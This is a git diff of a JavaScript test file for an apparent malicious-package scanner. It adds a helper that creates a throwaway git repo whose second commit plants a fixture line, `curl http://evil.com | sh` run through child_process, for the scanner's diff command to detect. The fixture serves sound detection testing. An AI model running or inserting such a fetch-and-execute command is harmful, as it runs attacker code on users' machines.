@@ -316,16 +316,33 @@ async function runDiffTests() {
     }
   });
 
-  // --- diff() with JSON output ---
+  // --- diff() with JSON output (uses tiny temp git repo, not full REPO_ROOT) ---
+
+  // Helper: create a minimal git repo with 2 commits for diff testing
+  function createMiniDiffRepo() {
+    const { execSync } = require('child_process');
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-diff-mini-'));
+    execSync('git init', { cwd: tmpDir, stdio: 'pipe' });
+    execSync('git config user.email "test@test.com"', { cwd: tmpDir, stdio: 'pipe' });
+    execSync('git config user.name "Test"', { cwd: tmpDir, stdio: 'pipe' });
+    // Commit 1: clean file
+    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({ name: 'diff-test', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmpDir, 'index.js'), 'module.exports = { safe: true };\n');
+    execSync('git add -A && git commit -m "initial"', { cwd: tmpDir, stdio: 'pipe' });
+    // Commit 2: add a threat
+    fs.writeFileSync(path.join(tmpDir, 'index.js'), 'const cp = require("child_process");\ncp.execSync("curl http://evil.com | sh");\n');
+    execSync('git add -A && git commit -m "add threat"', { cwd: tmpDir, stdio: 'pipe' });
+    return tmpDir;
+  }
 
   await asyncTest('DIFF: diff with json option on valid ref', async () => {
+    const miniRepo = createMiniDiffRepo();
     const origLog = console.log;
     const logs = [];
     console.log = (...args) => logs.push(args.join(' '));
     try {
-      const exitCode = await diff(REPO_ROOT, 'HEAD~1', { json: true });
+      const exitCode = await diff(miniRepo, 'HEAD~1', { json: true });
       if (exitCode !== 1) {
-        // Should have logged JSON output
         const jsonOutput = logs.find(l => l.startsWith('{'));
         if (jsonOutput) {
           const parsed = JSON.parse(jsonOutput);
@@ -336,17 +353,19 @@ async function runDiffTests() {
       }
     } finally {
       console.log = origLog;
+      try { fs.rmSync(miniRepo, { recursive: true, force: true }); } catch {}
     }
   });
 
   await asyncTest('DIFF: diff with text output shows summary', async () => {
+    const miniRepo = createMiniDiffRepo();
     const origLog = console.log;
     const origErr = console.error;
     const logs = [];
     console.log = (...args) => logs.push(args.join(' '));
     console.error = () => {};
     try {
-      const exitCode = await diff(REPO_ROOT, 'HEAD~1', { json: false });
+      const exitCode = await diff(miniRepo, 'HEAD~1', { json: false });
       if (exitCode !== 1) {
         const allOutput = logs.join('\n');
         assert(allOutput.includes('DIFF SUMMARY') || allOutput.includes('Risk Score'), 'Should show diff summary');
@@ -354,6 +373,7 @@ async function runDiffTests() {
     } finally {
       console.log = origLog;
       console.error = origErr;
+      try { fs.rmSync(miniRepo, { recursive: true, force: true }); } catch {}
     }
   });
 
